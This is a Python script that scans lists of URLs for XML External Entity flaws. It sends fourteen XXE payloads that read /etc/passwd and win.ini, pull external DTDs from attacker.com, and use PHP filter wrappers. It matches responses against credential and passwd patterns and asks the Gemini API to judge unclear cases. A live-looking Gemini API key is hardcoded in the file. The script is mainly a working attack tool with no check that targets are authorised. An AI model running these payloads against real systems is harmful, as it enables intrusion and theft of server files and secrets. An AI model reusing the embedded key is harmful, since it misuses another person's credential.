import os
import requests
import urllib.parse
import json
import time
import random
import string
import re
from concurrent.futures import ThreadPoolExecutor

# Gemini API configuration
GEMINI_API_KEY = "AIzaSyBRD2TjLNSV5LnTfD38DIy5CWjQy4SGJ_M"
GEMINI_API_URL = "https://generativelanguage.googleapis.com/v1beta/models/gemini-pro:generateContent"

# XXE payloads to test
XXE_PAYLOADS = [
    # Basic XXE test
    """<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
    <foo>&xxe;</foo>""",
    
    # XXE to read Windows files
    """<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "file:///c:/windows/win.ini" >]>
    <foo>&xxe;</foo>""",
    
    # XXE with parameter entities
    """<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY % xxe SYSTEM "file:///etc/passwd" >
    %xxe;]>
    <foo></foo>""",
    
    # XXE with CDATA
    """<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY % xxe SYSTEM "file:///etc/passwd" >
    <!ENTITY % cdata "<!ENTITY &#x25; test SYSTEM 'file:///etc/passwd'>">
    %cdata;
    %test;]>
    <foo></foo>""",
    
    # XXE with out-of-band (OOB) exploitation
    """<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY % xxe SYSTEM "http://attacker.com/malicious.dtd" >
    %xxe;]>
    <foo></foo>""",
    
    # XXE with PHP wrapper
    """<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "php://filter/convert.base64-encode/resource=/etc/passwd" >]>
    <foo>&xxe;</foo>""",
    
    # XXE with internal entity
    """<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY xxe "test" >]>
    <foo>&xxe;</foo>""",
    
    # XXE with DTD
    """<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo SYSTEM "http://attacker.com/malicious.dtd">
    <foo>bar</foo>""",
    
    # XXE with local DTD
    """<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo SYSTEM "file:///usr/local/app/schema.dtd">
    <foo>bar</foo>""",
    
    # XXE with SOAP
    """<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
    <!DOCTYPE foo [
    <!ELEMENT foo ANY >
    <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
    <soap:Body>
      <foo>&xxe;</foo>
    </soap:Body>
    </soap:Envelope>""",
    
    # XXE with SVG
    """<?xml version="1.0" standalone="yes"?>
    <!DOCTYPE test [ 
    <!ENTITY xxe SYSTEM "file:///etc/passwd" >]>
    <svg width="128px" height="128px" xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" version="1.1">
       <text font-size="16" x="0" y="16">&xxe;</text>
    </svg>""",
    
    # XXE with XInclude
    """<foo xmlns:xi="http://www.w3.org/2001/XInclude">
    <xi:include parse="text" href="file:///etc/passwd"/>
    </foo>""",
    
    # XXE with XML parameter entities
    """<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [
    <!ENTITY % xxe SYSTEM "file:///etc/passwd" >
    <!ENTITY % placeholder "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%xxe;'>">
    %placeholder;
    %error;]>
    <foo>bar</foo>""",
    
    # XXE with XML external entity expansion
    """<?xml version="1.0" encoding="ISO-8859-1"?>
    <!DOCTYPE foo [
    <!ENTITY % xxe SYSTEM "file:///etc/passwd" >
    <!ENTITY % internal "<!ENTITY &#x25; entity '<!ENTITY &#x26;#x25; error SYSTEM \"file:///nonexistent/%xxe;\">'>">
    %internal;
    %entity;
    %error;]>
    <foo>bar</foo>""",
]

# Patterns that might indicate successful XXE exploitation
XXE_SUCCESS_PATTERNS = [
    # Unix /etc/passwd file patterns
    "root:x:",
    "daemon:x:",
    "bin:x:",
    "sys:x:",
    "nobody:x:",
    "www-data:x:",
    
    # Windows file patterns
    "[fonts]",
    "[extensions]",
    "[files]",
    "[Mail]",
    "for 16-bit app support",
    
    # Common sensitive file contents
    "DB_PASSWORD",
    "API_KEY",
    "SECRET_KEY",
    "PRIVATE_KEY",
    "password=",
    "username=",
    "jdbc:mysql:",
    "ssh-rsa",
    
    # Base64 encoded file patterns (for PHP filter)
    "cm9vdDp4", # base64 of "root:x"
    "ZGFlbW9u", # base64 of "daemon"
    
    # Error messages that might reveal file contents
    "failed to load external entity",
    "Start tag expected",
    "No such file or directory",
    "Permission denied",
    "Access is denied",
    "Invalid URI",
]

# Error patterns that might indicate XXE vulnerability
XXE_ERROR_PATTERNS = [
    "XML parsing error",
    "XML syntax error",
    "unterminated entity reference",
    "undefined entity",
    "not well-formed",
    "mismatched tag",
    "failed to load external entity",
    "unresolved entity",
    "unknown entity",
    "entity not found",
    "invalid character",
    "invalid xml declaration",
    "invalid document structure",
    "invalid processing instruction",
    "invalid attribute",
    "invalid element",
    "invalid entity reference",
    "invalid comment",
    "invalid character reference",
    "invalid encoding",
    "invalid doctype",
    "invalid public identifier",
    "invalid system identifier",
    "invalid xml version",
    "invalid standalone declaration",
    "invalid entity value",
    "invalid attribute value",
    "invalid element content",
    "invalid name",
    "invalid namespace",
    "invalid namespace prefix",
    "invalid namespace uri",
    "invalid processing instruction target",
    "invalid processing instruction data",
    "invalid cdata section",
    "invalid character in entity value",
    "invalid character in attribute value",
    "invalid character in element content",
    "invalid character in processing instruction",
    "invalid character in comment",
    "invalid character in cdata section",
    "invalid character in doctype",
    "invalid character in public identifier",
    "invalid character in system identifier",
    "invalid character in xml declaration",
    "invalid character in standalone declaration",
    "invalid character in entity reference",
    "invalid character in character reference",
    "invalid character in encoding declaration",
    "invalid character in version declaration",
    "invalid character in name",
    "invalid character in namespace prefix",
    "invalid character in namespace uri",
    "invalid character in processing instruction target",
    "invalid character in processing instruction data",
]

# Headers for HTTP requests
HEADERS = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'en-US,en;q=0.5',
    'Connection': 'keep-alive',
    'Content-Type': 'application/xml',  # Default content type for XML
}

def generate_random_string(length=8):
    """Generate a random string for testing."""
    return ''.join(random.choice(string.ascii_letters + string.digits) for _ in range(length))

def extract_urls_with_params(file_path):
    """Extract URLs with parameters from a file."""
    urls = []
    try:
        with open(file_path, 'r') as file:
            for line in file:
                url = line.strip()
                if url:  # Make sure URL is not empty
                    urls.append(url)
    except Exception as e:
        print(f"Error reading file: {e}")
    
    print(f"Found {len(urls)} URLs to test.")
    return urls

def check_for_xxe_errors(response_text):
    """Check if the response contains XXE error messages."""
    for pattern in XXE_ERROR_PATTERNS:
        if pattern.lower() in response_text.lower():
            return True, pattern
    return False, None

def check_for_xxe_success(response_text):
    """Check if the response contains signs of successful XXE exploitation."""
    for pattern in XXE_SUCCESS_PATTERNS:
        if pattern in response_text:
            return True, pattern
    return False, None

def analyze_with_gemini(url, payload, response_content, original_content):
    """
    Use Gemini API to analyze if the XXE payload is likely to be successful.
    """
    # First, check for common XXE error patterns
    has_error, error_pattern = check_for_xxe_errors(response_content)
    if has_error:
        return True, f"POTENTIALLY VULNERABLE: XXE error detected: {error_pattern}"
    
    # Check for successful XXE exploitation
    is_successful, success_pattern = check_for_xxe_success(response_content)
    if is_successful:
        return True, f"VULNERABLE: XXE exploitation successful, found pattern: {success_pattern}"
    
    # Check for significant differences in response
    if len(response_content) != len(original_content) and abs(len(response_content) - len(original_content)) > 100:
        return True, f"POTENTIALLY VULNERABLE: Significant difference in response length ({len(response_content)} vs {len(original_content)})"
    
    # Use Gemini for more advanced analysis
    prompt = f"""
    I need to analyze if this XML External Entity (XXE) payload is likely to be successful based on the following response.
    
    URL: {url}
    Payload: {payload[:500]}... (truncated)
    
    Original Response Length: {len(original_content)}
    Modified Response Length: {len(response_content)}
    
    Modified Response (truncated if necessary):
    {response_content[:4000]}
    
    Please analyze if:
    1. There are any XML parsing error messages in the response
    2. The response shows signs of successful XXE exploitation (e.g., file contents, system information)
    3. The response structure has changed significantly compared to a normal response
    4. There are any indicators of file access or data exfiltration
    
    Respond with only "VULNERABLE" or "NOT VULNERABLE" followed by a brief explanation.
    """
    
    api_url = f"{GEMINI_API_URL}?key={GEMINI_API_KEY}"
    
    data = {
        "contents": [
            {
                "parts": [
                    {"text": prompt}
                ]
            }
        ],
        "generationConfig": {
            "temperature": 0.1,
            "maxOutputTokens": 200
        }
    }
    
    try:
        response = requests.post(api_url, json=data)
        if response.status_code == 200:
            result = response.json()
            if "candidates" in result and len(result["candidates"]) > 0:
                text = result["candidates"][0]["content"]["parts"][0]["text"]
                is_vulnerable = text.strip().startswith("VULNERABLE")
                explanation = text.strip()
                return is_vulnerable, explanation
        return False, "Error analyzing response with Gemini"
    except Exception as e:
        return False, f"Error calling Gemini API: {str(e)}"

def detect_xml_endpoints(url):
    """
    Detect if the endpoint accepts XML input by checking content types and responses.
    Returns a tuple of (accepts_xml, content_type, method)
    """
    try:
        # First try a GET request to see if it's an XML API
        response = requests.get(url, headers=HEADERS, timeout=10)
        
        # Check if response is XML
        content_type = response.headers.get('Content-Type', '').lower()
        if 'xml' in content_type:
            return True, content_type, 'GET'
        
        # Check if there are XML-related keywords in the response
        if '<xml' in response.text.lower() or '<?xml' in response.text.lower() or '<soap' in response.text.lower():
            return True, 'text/xml', 'GET'
        
        # Try a POST request with XML content
        test_xml = '<?xml version="1.0" encoding="UTF-8"?><test>test</test>'
        headers = HEADERS.copy()
        headers['Content-Type'] = 'application/xml'
        
        response = requests.post(url, data=test_xml, headers=headers, timeout=10)
        
        # Check if the server accepted our XML
        if response.status_code < 400:  # Anything other than client/server error
            return True, 'application/xml', 'POST'
        
        # Try with different content types
        for content_type in ['text/xml', 'application/soap+xml']:
            headers['Content-Type'] = content_type
            response = requests.post(url, data=test_xml, headers=headers, timeout=10)
            if response.status_code < 400:
                return True, content_type, 'POST'
        
        return False, None, None
    
    except Exception as e:
        print(f"Error detecting XML endpoint for {url}: {e}")
        return False, None, None

def test_url_for_xxe(url):
    """Test a URL for XXE vulnerabilities."""
    print(f"Testing URL: {url}")
    results = []
    
    try:
        # First, detect if the endpoint accepts XML
        accepts_xml, content_type, method = detect_xml_endpoints(url)
        
        if not accepts_xml:
            print(f"URL {url} does not appear to accept XML input. Skipping.")
            return results
        
        print(f"URL {url} accepts XML via {method} with content type {content_type}")
        
        # Get a baseline response
        if method == 'GET':
            normal_response = requests.get(url, headers=HEADERS, timeout=10)
        else:  # POST
            test_xml = '<?xml version="1.0" encoding="UTF-8"?><test>test</test>'
            headers = HEADERS.copy()
            headers['Content-Type'] = content_type
            normal_response = requests.post(url, data=test_xml, headers=headers, timeout=10)
        
        normal_content = normal_response.text
        
        # Test XXE payloads
        for payload in XXE_PAYLOADS:
            try:
                headers = HEADERS.copy()
                headers['Content-Type'] = content_type
                
                if method == 'GET':
                    # For GET, we need to find a way to inject the payload
                    # This is tricky and might not work for all endpoints
                    parsed_url = urllib.parse.urlparse(url)
                    query_params = urllib.parse.parse_qs(parsed_url.query)
                    
                    # If there are query parameters, try to inject into each one
                    if query_params:
                        for param, values in query_params.items():
                            xxe_params = {p: values[0] for p, values in query_params.items()}
                            xxe_params[param] = payload
                            xxe_url = f"{parsed_url.scheme}://{parsed_url.netloc}{parsed_url.path}?{urllib.parse.urlencode(xxe_params, doseq=True)}"
                            
                            xxe_response = requests.get(xxe_url, headers=headers, timeout=10)
                            
                            # Check for XXE success or errors
                            is_successful, success_pattern = check_for_xxe_success(xxe_response.text)
                            has_error, error_pattern = check_for_xxe_errors(xxe_response.text)
                            
                            if is_successful:
                                print(f"Potential XXE found in parameter {param} with payload")
                                results.append({
                                    'url': url,
                                    'param': param,
                                    'payload': payload,
                                    'status': 'Potential XXE Vulnerability (GET)',
                                    'analysis': f"XXE exploitation successful, found pattern: {success_pattern}"
                                })
                                break
                            
                            if has_error:
                                print(f"Potential XXE found in parameter {param} with payload")
                                results.append({
                                    'url': url,
                                    'param': param,
                                    'payload': payload,
                                    'status': 'Potential XXE Vulnerability (GET)',
                                    'analysis': f"XXE error detected: {error_pattern}"
                                })
                                break
                            
                            # Use Gemini for more advanced analysis
                            is_vulnerable, explanation = analyze_with_gemini(xxe_url, payload, xxe_response.text, normal_content)
                            
                            if is_vulnerable:
                                print(f"Potential XXE found in parameter {param} with payload")
                                results.append({
                                    'url': url,
                                    'param': param,
                                    'payload': payload,
                                    'status': 'Potential XXE Vulnerability (GET)',
                                    'analysis': explanation
                                })
                                break
                    else:
                        # If no query parameters, try to inject into path
                        # This is even more tricky and might not work for most endpoints
                        continue
                else:  # POST
                    xxe_response = requests.post(url, data=payload, headers=headers, timeout=10)
                    
                    # Check for XXE success or errors
                    is_successful, success_pattern = check_for_xxe_success(xxe_response.text)
                    has_error, error_pattern = check_for_xxe_errors(xxe_response.text)
                    
                    if is_successful:
                        print(f"Potential XXE found with payload")
                        results.append({
                            'url': url,
                            'param': 'POST body',
                            'payload': payload,
                            'status': 'Potential XXE Vulnerability (POST)',
                            'analysis': f"XXE exploitation successful, found pattern: {success_pattern}"
                        })
                        break
                    
                    if has_error:
                        print(f"Potential XXE found with payload")
                        results.append({
                            'url': url,
                            'param': 'POST body',
                            'payload': payload,
                            'status': 'Potential XXE Vulnerability (POST)',
                            'analysis': f"XXE error detected: {error_pattern}"
                        })
                        break
                    
                    # Use Gemini for more advanced analysis
                    is_vulnerable, explanation = analyze_with_gemini(url, payload, xxe_response.text, normal_content)
                    
                    if is_vulnerable:
                        print(f"Potential XXE found with payload")
                        results.append({
                            'url': url,
                            'param': 'POST body',
                            'payload': payload,
                            'status': 'Potential XXE Vulnerability (POST)',
                            'analysis': explanation
                        })
                        break
            
            except Exception as e:
                print(f"Error testing XXE payload: {e}")
                continue
        
    except Exception as e:
        print(f"Error processing URL {url}: {e}")
    
    return results

def scan_xxe(urls_file_path, max_workers=3):
    """
    Scan URLs for XXE vulnerabilities.
    
    Args:
        urls_file_path: Path to the file containing URLs
        max_workers: Maximum number of concurrent workers
    
    Returns:
        List of potential XXE vulnerabilities
    """
    if not os.path.exists(urls_file_path):
        print(f"File not found: {urls_file_path}")
        return []
    
    urls = extract_urls_with_params(urls_file_path)
    if not urls:
        print("No URLs found in the file.")
        return []
    
    print(f"Found {len(urls)} URLs to test.")
    
    # Process URLs in smaller batches to show progress
    batch_size = 5
    all_results = []
    
    for i in range(0, len(urls), batch_size):
        batch = urls[i:i+batch_size]
        print(f"\nProcessing batch {i//batch_size + 1}/{(len(urls) + batch_size - 1)//batch_size}...")
        
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            results = list(executor.map(test_url_for_xxe, batch))
            
            for result in results:
                all_results.extend(result)
                
        # Show intermediate results
        if all_results:
            print(f"Found {len(all_results)} potential vulnerabilities so far")
    
    # Save results to file
    output_dir = os.path.dirname(urls_file_path)
    domain = os.path.basename(urls_file_path).split('_')[0]
    output_file = os.path.join(output_dir, f"{domain}_xxe_results.txt")
    
    with open(output_file, 'w') as f:
        if all_results:
            f.write("XXE Vulnerability Scan Results\n")
            f.write("=======================================\n\n")
            
            for result in all_results:
                f.write(f"URL: {result['url']}\n")
                f.write(f"Parameter: {result['param']}\n")
                f.write(f"Payload: {result['payload'][:500]}... (truncated)\n")
                f.write(f"Status: {result['status']}\n")
                f.write(f"Analysis: {result['analysis']}\n")
                f.write("-----------------------------\n\n")
        else:
            f.write("No XXE vulnerabilities found.\n")
    
    return all_results

def test_specific_endpoint(target_url):
    """Test a specific endpoint for XXE vulnerabilities."""
    print(f"Testing endpoint: {target_url}")
    
    results = test_url_for_xxe(target_url)
    
    if results:
        print(f"\nFound {len(results)} potential XXE vulnerabilities!")
        for result in results:
            print(f"\nURL: {result['url']}")
            print(f"Parameter: {result['param']}")
            print(f"Payload: {result['payload'][:500]}... (truncated)")
            print(f"Status: {result['status']}")
            print(f"Analysis: {result['analysis']}")
    else:
        print("\nNo XXE vulnerabilities found.")
    
    return results

if __name__ == "__main__":
    # For testing the script directly
    import sys
    
    if len(sys.argv) > 1:
        file_path = sys.argv[1]
        
        # Check if it's a direct endpoint test
        if file_path.startswith('http'):
            results = test_specific_endpoint(file_path)
        else:
            print(f"Scanning file: {file_path}")
            results = scan_xxe(file_path)
            
            if results:
                print(f"\nFound {len(results)} potential XXE vulnerabilities!")
                for result in results:
                    print(f"\nURL: {result['url']}")
                    print(f"Parameter: {result['param']}")
                    print(f"Payload: {result['payload'][:500]}... (truncated)")
                    print(f"Status: {result['status']}")
                    print(f"Analysis: {result['analysis']}")
            else:
                print("\nNo XXE vulnerabilities found.")
    else:
        print("Usage: python xxe_test.py <path_to_urls_file_or_direct_url>")
        print("Examples:")
        print("  python xxe_test.py C:\\Users\\begad\\OneDrive\\Desktop\\Recon-test\\crawler\\example.com_urls.txt")
        print("  python xxe_test.py http://vulnerable-website.com/api/xml")